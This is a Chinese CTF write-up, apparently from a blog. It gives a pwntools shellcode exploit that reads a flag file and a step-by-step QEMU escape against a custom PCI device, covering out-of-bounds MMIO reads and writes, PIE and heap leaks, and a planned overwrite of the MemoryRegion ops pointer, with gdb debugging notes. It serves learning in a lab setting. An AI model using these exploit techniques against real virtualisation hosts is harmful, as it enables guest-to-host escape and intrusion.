<p>但这题也卡了我一个小时，主要卡在 mmap 的 flags 上。最开始 flags =
0x22 时 mmap 即使成功分配内存也无法将文件内容映射到内存中，最后调整为
flags=0x2 才成功映射</p>
<p>以及通过这题我还学到了 mmap 在分配内存时可以将 addr 设置为 0，这样
mmap 会自动寻找一块合适的内存，而我们知道 rax 是 mmap
的返回值，所以我们可以通过控制 rax 来获取 mmap 申请的内存地址。</p>
<p>我这里没有远程环境，不确定这种做法是否能得到 flag</p>
<p>况且之前的 NSSCTF Round18 还出现了本地能打通远程打不通的情况，可能是
flag 文件不跟 vuln 文件在同一个文件夹下</p>
<p>exp 如下</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">ip = <span class="string">&#x27;&#x27;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">file = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="comment"># io = remote(ip[0],int(ip[1]))</span></span><br><span class="line">io = process(file)</span><br><span class="line">elf = ELF(file)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line">shellcode_open  = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag.txt&quot;</span>)</span><br><span class="line">shellcode_mmap  = shellcraft.mmap(<span class="number">0</span>,<span class="number">0x80</span>,<span class="number">7</span>,<span class="number">0x2</span>,<span class="number">3</span>,<span class="number">0</span>)</span><br><span class="line">shellcode_write = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rsi,rax</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor edx, edx</span></span><br><span class="line"><span class="string">mov dl, 0x80</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = shellcode_open</span><br><span class="line">shellcode += shellcode_mmap</span><br><span class="line">shellcode += shellcode_write</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="escape_langlang_mountain2">escape_langlang_mountain2</h2>
<p>QEMU 逃逸，第一次做 ;(</p>
<p>读
<code>Dockerfile</code>，了解到它在搭起环境以后启动了<code>start.sh</code>，</p>
<p>再读 <code>start.sh</code>，了解到它启动了 <code>xinetd</code>
程序</p>
<p>再读 <code>xinetd</code>，这个程序的主要作用是监听指定
port，并根据预先定义好的配置来启动相应服务。可以看到
<code>server_args</code> 处启动了 <code>run.sh</code></p>
<p>再读 <code>run.sh</code>，发现它用 QEMU 起了一个程序，通过
<code>-device vn</code> 我们可以知道 <code>vn</code> 是作为 QEMU
中的一个 <code>pci设备</code> 存在的。</p>
<p>通过 IDA 查找字符串 <code>vn_</code> 可以找到
<code>vn_instance_init</code>，跟进调用
<code>字符串vn_instance_init</code> 的
<code>函数vn_instance_init</code>，再按 x 查看
<code>函数vn_instance_init</code> 的引用，可以看到下面还有一个
<code>vn_class_init</code> ，反汇编后看到</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">vn_class_init</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = PCI_DEVICE_CLASS_23(a1);</span><br><span class="line">  *(_QWORD *)(result + <span class="number">176</span>) = pci_vn_realize;</span><br><span class="line">  *(_QWORD *)(result + <span class="number">184</span>) = <span class="number">0LL</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">208</span>) = <span class="number">0x1234</span>; <span class="comment">// 厂商ID (Vendor ID)</span></span><br><span class="line">  *(_WORD *)(result + <span class="number">210</span>) = <span class="number">0x2024</span>; <span class="comment">// 设备ID (Device ID)</span></span><br><span class="line">  *(_BYTE *)(result + <span class="number">212</span>) = <span class="number">0x10</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">214</span>) = <span class="number">0xFF</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过厂商ID和设备ID，我们可以判断下列 pci 设备中
<code>00:04.0 Class 00ff: 1234:2024</code> 就是我们要找的
<code>vn</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/sys/devices/pci0000:00/0000:00:04.0 # lspci</span><br><span class="line">lspci</span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 00ff: 1234:2024</span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br></pre></td></tr></table></figure>
<p>进而去<code>/sys/devices/pci0000:00/0000:00:04.0</code>
目录查看该设备 <code>mmio</code> 与 <code>pmio</code> 的注册情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/sys/devices/pci0000:00/0000:00:04.0 # ls -al</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">-r--r--r--    1 0        0             4096 Feb 18 12:18 resource</span><br><span class="line">-rw-------    1 0        0             4096 Feb 18 12:18 resource0</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>有了 resource0 这个文件，我们就可以在exp里 <code>mmap</code>
做虚拟地址映射。</p>
<p>并且我们可以看到 <code>vn</code> 这个设备只注册了
<code>mmio</code>，那就考虑用 <a
href="https://ctf-wiki.org/pwn/virtualization/qemu/exploitation/intro/#_3">mmio攻击（点击这里了解
mmio 运行原理）</a></p>
<p>然后，本题的核心在于伪造 MemoryRegion
结构体，由于上述部分我也不清楚为什么要这样去 read 和
write，所以还需要补很多基础知识 (2.18晚)</p>
<p>花了一整个晚上的时间把 qemu 调试搞定了，明天找一下 QEMU
相关部分的源码读一下 (2.19晚)</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 记录一下如何用 docker 调试 QEMU</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先将 exp.c 静态编译为二进制文件</span></span><br><span class="line">gcc exp.c --static -o exp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后解包 rootfs.cpio，参考https://www.jianshu.com/p/f08e34cf08ad 的“调试”部分</span></span><br><span class="line">hen rootfs.cpio</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 exp 放入 /core/usr/bin 中</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新打包 roortfs.cpio</span></span><br><span class="line">gen rootfs.cpio</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 run.sh </span></span><br><span class="line">vim run.sh</span><br><span class="line"><span class="comment"># #!/bin/sh</span></span><br><span class="line"><span class="comment"># ./qemu-system-x86_64 \</span></span><br><span class="line"><span class="comment">#     -L ./pc-bios \</span></span><br><span class="line"><span class="comment">#     -m 128M \</span></span><br><span class="line"><span class="comment">#     -append &quot;console=ttyS0&quot; \</span></span><br><span class="line"><span class="comment">#     -kernel bzImage \</span></span><br><span class="line"><span class="comment">#     -initrd rootfs.cpio \</span></span><br><span class="line"><span class="comment">#     -device vn \</span></span><br><span class="line"><span class="comment">#     -nographic \</span></span><br><span class="line"><span class="comment">#     -no-reboot \</span></span><br><span class="line"><span class="comment">#     -monitor /dev/null \</span></span><br><span class="line"><span class="comment">#     -smp 2 \</span></span><br><span class="line"><span class="comment">#     -s -S</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 Dockerfile，在创建容器时安装 qemu-system-x86 gdb，这一步其实在 容器的shell里也能install，可以跳过</span></span><br><span class="line">vim Dockerfile <span class="comment"># 下面内容只是 RUN 部分，其他部分不动</span></span><br><span class="line"><span class="comment"># RUN sed -i &quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot; /etc/apt/sources.list &amp;&amp; \</span></span><br><span class="line"><span class="comment">#     apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span></span><br><span class="line"><span class="comment">#     apt-get install -y lib32z1 xinetd \</span></span><br><span class="line"><span class="comment">#                        libpixman-1-dev libepoxy-dev libpng16-16 libjpeg8-dev \</span></span><br><span class="line"><span class="comment">#                        libfdt-dev libnuma-dev libglib2.0-dev \</span></span><br><span class="line"><span class="comment">#                        libgtk-3-dev libasound2-dev libcurl4 qemu-system-x86 gdb</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># build 与 启动容器</span></span><br><span class="line">docker-compose build</span><br><span class="line">docker start vnctf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果已经提前 docker-compose 好了，则可以直接通过 docker cp 来修改内部文件</span></span><br><span class="line">docker <span class="built_in">cp</span> /path/to/file container_name:/whatever/path/you/want/to/file</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动tmux，分页记为 pane1 和 pane2</span></span><br><span class="line"><span class="comment"># pane1:</span></span><br><span class="line">docker <span class="built_in">exec</span> -ti vnctf /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># pane2:</span></span><br><span class="line">docker <span class="built_in">exec</span> -ti vnctf /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># pane1:</span></span><br><span class="line">./run.sh <span class="comment"># 这里运行以后应该是什么也不会出现</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pane2:</span></span><br><span class="line">ps -ax |grep <span class="string">&quot;qemu&quot;</span> <span class="comment"># 这一步获取 qemu 的进程号PID,用于 (gdb) attach PID</span></span><br><span class="line">gdb ./qemu-system-x86_64</span><br><span class="line">(gdb) attach PID <span class="comment"># 比如 (gdb) attach 406</span></span><br><span class="line">(gdb) <span class="built_in">continue</span> <span class="comment"># 输入完以后看一眼 pane1，如果qemu启动了就等qemu启动</span></span><br><span class="line">               <span class="comment"># 如果没启动就继续输入 (gdb) continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pane1:</span></span><br><span class="line"><span class="comment"># 此时 QEMU 正常运行，我们可以在里面输入一些命令比如ls等查看</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pane2:</span></span><br><span class="line">(gdb) b vn_mmio_read</span><br><span class="line"></span><br><span class="line"><span class="comment"># pane1:</span></span><br><span class="line"><span class="built_in">cd</span> /usr/bin <span class="comment"># 这里是前面解包后的时候 exp 放入的文件夹</span></span><br><span class="line">./exp</span><br><span class="line"></span><br><span class="line"><span class="comment"># pane2:</span></span><br><span class="line">此时就可以开始调试了</span><br></pre></td></tr></table></figure>
<p>今晚去 ctf-wiki 上看了一下 QEMU 关于 MemoryRegion
相关的代码和结构体，但我突然意识到题目中设备的 <code>mmio_read</code> 和
<code>mmio_write</code> 是自己实现的 (比如<a
href="https://github.com/rcvalle/blizzardctf2017/blob/master/strng.c">blizzardCTF
里的 strng</a>)，所以在互联网上不会找到相关的源码，只能反汇编去硬看</p>
<p>到这里好像有点乱了，我们来捋一下：</p>
<p>QEMU 提供了一套完整的模拟硬件给 QEMU 上的 kernel 来使用，而
<code>-device</code> 参数为 kernel 提供了模拟的 pci 设备。</p>
<p>如果 kernel 实现了类似 linux 的 rootfs，我们就可以通过
<code>lspci</code> 来查看相关 pci，并在/sys/devices/...找到 pci
设备启动时 kernel 分配给 pci 的资源，也就是 resource0
等，这也是前文提到过的。</p>
<p>resource0 可以看作是一大片开关，当我们修改 resource0
中的内容时，可以看做对应开关被启动，pci设备也随着开关的启动而变化，具体表现为“控制寄存器、状态寄存器以及设备内部的内存区域
随着 resource0 的变化而变化”</p>
<p>所以我们可以 open resource0 这个文件，用 mmap
映射它，从而使我们能够在C代码中对 resource0 这片内存进行修改</p>
<p>可是由于 QEMU 也只不过是一个程序，虚拟的 pci
设备意味着，一定有一片内存存储着 pci 相关的数据</p>
<blockquote>
<p>关于 pci 存储数据的这一部分好像就涉及 QOM
了，还没太搞懂，总之跟pci_xx_realize, xx_class_init, xx_instance_init
等函数有关</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">假设我们的调用链是这样的: </span><br><span class="line">docker -&gt; QEMU -&gt; exp</span><br><span class="line"></span><br><span class="line">则 docker 会让 QEMU 误以为自己占据全部内存空间，QEMU 会让 exp 认为自己占据全部内存空间</span><br><span class="line"></span><br><span class="line">而 QEMU 的 pci 设备的 MemoryRegion 就存储在 QEMU 的堆区上，我们在程序 exp 中读写 resource0，就相当于操控 vn_mmio_read 和 vn_mmio_write 去读写 QEMU 的堆区，如果我们正好修改到 MemoryRegion 的 xx_mmio_ops 指针，就可以劫持控制流。</span><br></pre></td></tr></table></figure>
<p>那么，接下来我们要做的事情就是去读一下 vn_mmio_read 和 vn_mmio_write
的反汇编，了解怎样读写堆区内容。</p>
<p><a href="https://imgloc.com/image/oNxdA"><img
src="https://i0.imgs.ovh/2024/02/20/oNxdA.md.png"
alt="oNxdA.md.png" /></a></p>
<p>由于对 QEMU 不是很熟悉，我只能瞎命名，vn_mmio_write 的大体逻辑是</p>
<ul>
<li><p><code>object_dynamic_cast_assert</code>是动态类型转换，我OOP学的很烂所以不清楚这是什么😭，猜测是申请一块堆的地址然后用
ptr 指向这块地址</p></li>
<li><p>①如果 op == 0x30 且 ptr[737] == 0</p>
<ul>
<li>ptr[ ptr[736]/8 + 720 ] = var，并将 ptr[737] 设置为1</li>
</ul></li>
<li><p>②如果 op == 0x10 且 var &lt; 0x3C</p>
<ul>
<li>ptr[736] = var</li>
<li>这里可以用负数来上溢，从而可以读很大一片空间的内容</li>
</ul></li>
<li><p>③如果 op == 0x20 且 var 的高32位 &lt; 0x3C</p>
<ul>
<li>ptr[ HIDWORD(var) + 720 ] = (LODWORD)var</li>
</ul></li>
</ul>
<p>同理 vn_mmio_read 也可以分析出来。</p>
<p>通过分析我们可以得知，vn_mmio_write可以实现一些越界写，同理分析
vn_mmio_read
我们可以得知，令可以实现一些越界读，根据反汇编我们可以定制一下这道题的
mmio_read</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    *((<span class="type">uint64_t</span>*)(mmio_base + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">uint32_t</span>*)(mmio_base + addr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write_idx</span><span class="params">(<span class="type">uint64_t</span> idx, <span class="type">uint64_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> val = value + (idx &lt;&lt; <span class="number">32</span>);</span><br><span class="line">    mmio_write(<span class="number">0x20</span>,val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过 Shift + F12
查<code>/bin/sh</code>可以跟进到这道题的后门函数0x67429B，我们需要跳转到这里去执行execv("/bin/sh");</p>
<p>现在我们知道了怎样读写堆区，也知道写入什么东西。但我们不知道 ptr[736]
附近是不是 MemoryRegion，而且 QEMU 会启动 pie，我们需要绕过 pie
才能利用后门函数。</p>
<p>所以我们就先读一些内容，看看附近有没有什么能利用的东西</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> catflag_addr = <span class="number">0x6E65F9</span>;</span><br><span class="line"></span><br><span class="line">    getMMIOBase();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_base Resource0Base: %p\n&quot;</span>, mmio_base);</span><br><span class="line">    </span><br><span class="line">    <span class="type">uint64_t</span> test_low,test_high,test;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">-1</span>;i&gt;=<span class="number">-30</span>;i--) &#123;</span><br><span class="line">        mmio_write(<span class="number">0x10</span>, i*<span class="number">0x8</span>);</span><br><span class="line">        test_low = mmio_read(<span class="number">0x20</span>);</span><br><span class="line">        mmio_write(<span class="number">0x10</span>, i*<span class="number">0x8</span> + <span class="number">0x4</span>);</span><br><span class="line">        test_high = mmio_read(<span class="number">0x20</span>);</span><br><span class="line">        test = test_low + (test_high &lt;&lt; <span class="number">32</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;test%d = 0x%llx\n&quot;</span>, -i, test);</span><br><span class="line">        getchar();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">/usr/bin # ./exp</span></span><br><span class="line"><span class="comment">mmio_base Resource0Base: 0x7fafa8025000</span></span><br><span class="line"><span class="comment">test1 = 0x0</span></span><br><span class="line"><span class="comment">test2 = 0x0</span></span><br><span class="line"><span class="comment">test3 = 0x0</span></span><br><span class="line"><span class="comment">test4 = 0x0</span></span><br><span class="line"><span class="comment">test5 = 0x55da28130f00</span></span><br><span class="line"><span class="comment">test6 = 0x55da2812ef78</span></span><br><span class="line"><span class="comment">test7 = 0x0</span></span><br><span class="line"><span class="comment">test8 = 0x55da271feb98</span></span><br><span class="line"><span class="comment">test9 = 0x55da27e4f820</span></span><br><span class="line"><span class="comment">test10 = 0x55da2812ef58</span></span><br><span class="line"><span class="comment">test11 = 0x0</span></span><br><span class="line"><span class="comment">test12 = 0x1</span></span><br><span class="line"><span class="comment">test13 = 0x0</span></span><br><span class="line"><span class="comment">test14 = 0x0</span></span><br><span class="line"><span class="comment">test15 = 0x10001</span></span><br><span class="line"><span class="comment">test16 = 0x0</span></span><br><span class="line"><span class="comment">test17 = 0x55da256a335b // -&gt; memory_region_destructor_none</span></span><br><span class="line"><span class="comment">test18 = 0xfebf1000</span></span><br><span class="line"><span class="comment">test19 = 0x0</span></span><br><span class="line"><span class="comment">test20 = 0x1000</span></span><br><span class="line"><span class="comment">test21 = 0x0</span></span><br><span class="line"><span class="comment">test22 = 0x55da271feae0</span></span><br><span class="line"><span class="comment">test23 = 0x55da2812e470</span></span><br><span class="line"><span class="comment">test24 = 0x55da25dd01e0 // -&gt; vn_mmio_ops</span></span><br><span class="line"><span class="comment">test25 = 0x55da2812e470</span></span><br><span class="line"><span class="comment">test26 = 0x55da2812e470</span></span><br><span class="line"><span class="comment">test27 = 0x0</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>我们逐个地址 <code>x/2gx</code>
一下，最终发现这几个比较有意思的地方</p>
<blockquote>
<p>PIE</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) x/<span class="number">2</span>gx <span class="number">0x55da256a335b</span></span><br><span class="line"><span class="number">0x55da256a335b</span> &lt;memory_region_destructor_none&gt;: <span class="number">0xe5894855fa1e0ff3</span>      <span class="number">0xf3c35d90f87d8948</span></span><br></pre></td></tr></table></figure>
<p>我们在 IDA 中是能搜到这个函数的，它在 QEMU 里的偏移量是
0x82B35B，通过这个我们就可以计算出 docker 加载 QEMU 时的基地址了</p>
<blockquote>
<p>heap &amp; MemoryRegion</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) x/<span class="number">2</span>gx <span class="number">0x55da25dd01e0</span></span><br><span class="line"><span class="number">0x55da25dd01e0</span> &lt;vn_mmio_ops&gt;:   <span class="number">0x000055da252d3458</span>      <span class="number">0x000055da252d3502</span></span><br></pre></td></tr></table></figure>
<p>我们找到了需要的 ops，test24 存的就是 0x55da25dd01e0</p>
<p>所以我们有如下对应关系： <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ptr[<span class="number">-24</span> + <span class="number">720</span>] -&gt; <span class="number">0x55da25dd01e0</span></span><br></pre></td></tr></table></figure></p>
<p>那很自然的我们就想到，ptr的其他地方存着什么？这附近是不是就是
MemoryRegion？可是我们并没有 (&amp;ptr[-24 + 720])，但我们知道的是
MemoryRegion 存在堆里，所以我们考虑用 find
命令查找（看起来像堆地址的）堆地址附近查找 0x55da25dd01e0 这个值就行</p>
<p>最终我们用到的是 test23 -&gt; 0x55da2812e470</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 查找 [0x55da2812e470,0x55da2812e470+0x1000] 中存放0x55da25dd01e0的地址</span></span><br><span class="line">(gdb) find <span class="number">0x55da2812e470</span>, <span class="number">0x55da2812e470</span>+<span class="number">0x1000</span>, <span class="number">0x55da25dd01e0</span></span><br><span class="line"><span class="number">0x55da2812eef0</span></span><br><span class="line"><span class="number">1</span> pattern found.</span><br></pre></td></tr></table></figure>
<p>因此我们知道 0x55da2812eef0 存放着我们需要的 0x55da25dd01e0</p>
<p>观察发现这个地址跟我们的 test10 非常近，可以计算一下
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) print(<span class="number">0x55da2812ef58</span> - <span class="number">0x55da2812eef0</span>)</span><br><span class="line">$<span class="number">1</span> = <span class="number">104</span></span><br><span class="line"><span class="comment">// 104 = 0x68</span></span><br><span class="line"><span class="comment">// 所以 test23 = 0x55da2812eef0 =  0x55da2812ef58 - 0x68 = test10 - 0x68</span></span><br></pre></td></tr></table></figure></p>
<p>而我们打印一下更多附近的值，可以看到</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) x/<span class="number">52</span>xg <span class="number">0x55da2812ef58</span> - <span class="number">0x58</span> - <span class="number">0x60</span></span><br><span class="line"><span class="number">0x55da2812eea0</span>: <span class="number">0x000055da271f1840</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812eeb0</span>: <span class="number">0x000055da280e1f00</span>      <span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x55da2812eec0</span>: <span class="number">0x000055da2812e470</span>      <span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x55da2812eed0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812eee0</span>: <span class="number">0x000055da2812e470</span>      <span class="number">0x000055da2812e470</span></span><br><span class="line"><span class="number">0x55da2812eef0</span>: <span class="number">0x000055da25dd01e0</span>      <span class="number">0x000055da2812e470</span> &lt;- test <span class="number">24</span> | <span class="number">23</span></span><br><span class="line"><span class="number">0x55da2812ef00</span>: <span class="number">0x000055da271feae0</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef10</span>: <span class="number">0x0000000000001000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef20</span>: <span class="number">0x00000000febf1000</span>      <span class="number">0x000055da256a335b</span> &lt;- test <span class="number">18</span> | <span class="number">17</span></span><br><span class="line"><span class="number">0x55da2812ef30</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000010001</span></span><br><span class="line"><span class="number">0x55da2812ef40</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef50</span>: <span class="number">0x0000000000000001</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef60</span>: <span class="number">0x000055da2812ef58</span>      <span class="number">0x000055da27e4f820</span></span><br><span class="line"><span class="number">0x55da2812ef70</span>: <span class="number">0x000055da271feb98</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef80</span>: <span class="number">0x000055da2812ef78</span>      <span class="number">0x000055da28130f00</span></span><br><span class="line"><span class="number">0x55da2812ef90</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812efa0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812efb0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span> &lt;- test <span class="number">0</span> | <span class="number">-1</span></span><br><span class="line"><span class="number">0x55da2812efc0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812efd0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812efe0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812eff0</span>: <span class="number">0x00000000ffffff2c</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812f000</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000061</span></span><br><span class="line"><span class="number">0x55da2812f010</span>: <span class="number">0x000055da2812d3c0</span>      <span class="number">0x000055da273b01d0</span></span><br><span class="line"><span class="number">0x55da2812f020</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x000055da25725d5f</span></span><br><span class="line"><span class="number">0x55da2812f030</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x000055da25725de1</span></span><br></pre></td></tr></table></figure>
<p>我们回到 <a
href="https://ctf-wiki.org/pwn/virtualization/qemu/basic-knowledge/mm/">ctf-wiki-QEMU</a>
里查看一下 MemoryRegion</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MemoryRegion</span> &#123;</span></span><br><span class="line">    Object parent_obj;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* private: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The following fields should fit in a cache line */</span></span><br><span class="line">    <span class="type">bool</span> romd_mode;</span><br><span class="line">    <span class="type">bool</span> ram;</span><br><span class="line">    <span class="type">bool</span> subpage;</span><br><span class="line">    <span class="type">bool</span> readonly; <span class="comment">/* For RAM regions */</span></span><br><span class="line">    <span class="type">bool</span> nonvolatile;</span><br><span class="line">    <span class="type">bool</span> rom_device;</span><br><span class="line">    <span class="type">bool</span> flush_coalesced_mmio;</span><br><span class="line">    <span class="type">bool</span> global_locking;</span><br><span class="line">    <span class="type">uint8_t</span> dirty_log_mask;</span><br><span class="line">    <span class="type">bool</span> is_iommu;</span><br><span class="line">    RAMBlock *ram_block;</span><br><span class="line">    Object *owner;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> MemoryRegionOps *ops;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line">    MemoryRegion *container;    <span class="comment">// 指向父 MemoryRegion</span></span><br><span class="line">    Int128 size;    <span class="comment">// 内存区域大小</span></span><br><span class="line">    hwaddr addr;    <span class="comment">// 在父 MR 中的偏移量</span></span><br><span class="line">    <span class="type">void</span> (*destructor)(MemoryRegion *mr);</span><br><span class="line">    <span class="type">uint64_t</span> align;</span><br><span class="line">    <span class="type">bool</span> terminates;</span><br><span class="line">    <span class="type">bool</span> ram_device;</span><br><span class="line">    <span class="type">bool</span> enabled;</span><br><span class="line">    <span class="type">bool</span> warning_printed; <span class="comment">/* For reservations */</span></span><br><span class="line">    <span class="type">uint8_t</span> vga_logging_count;</span><br><span class="line">    MemoryRegion *alias;    <span class="comment">// 仅在 alias MR 中，指向实际的 MR</span></span><br><span class="line">    hwaddr alias_offset;</span><br><span class="line">    <span class="type">int32_t</span> priority;</span><br><span class="line">    QTAILQ_HEAD(, MemoryRegion) subregions;</span><br><span class="line">    QTAILQ_ENTRY(MemoryRegion) subregions_link;</span><br><span class="line">    QTAILQ_HEAD(, CoalescedMemoryRange) coalesced;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">unsigned</span> ioeventfd_nb;</span><br><span class="line">    MemoryRegionIoeventfd *ioeventfds;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>假设我们把 test24 看作上面结构体的 const MemoryRegionOps *ops;
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x55da2812eea0</span>: <span class="number">0x000055da271f1840</span></span><br><span class="line"><span class="number">0x55da2812eea8</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812eeb0</span>: <span class="number">0x000055da280e1f00</span></span><br><span class="line"><span class="number">0x55da2812eeb8</span>: <span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x55da2812eec0</span>: <span class="number">0x000055da2812e470</span></span><br><span class="line"><span class="number">0x55da2812eec8</span>: <span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x55da2812eed0</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812eed8</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812eee0</span>: <span class="number">0x000055da2812e470</span></span><br><span class="line"><span class="number">0x55da2812eee8</span>: <span class="number">0x000055da2812e470</span></span><br><span class="line"><span class="number">0x55da2812eef0</span>: <span class="number">0x000055da25dd01e0</span> <span class="number">-24</span> -&gt; test24 -&gt; ops</span><br><span class="line"><span 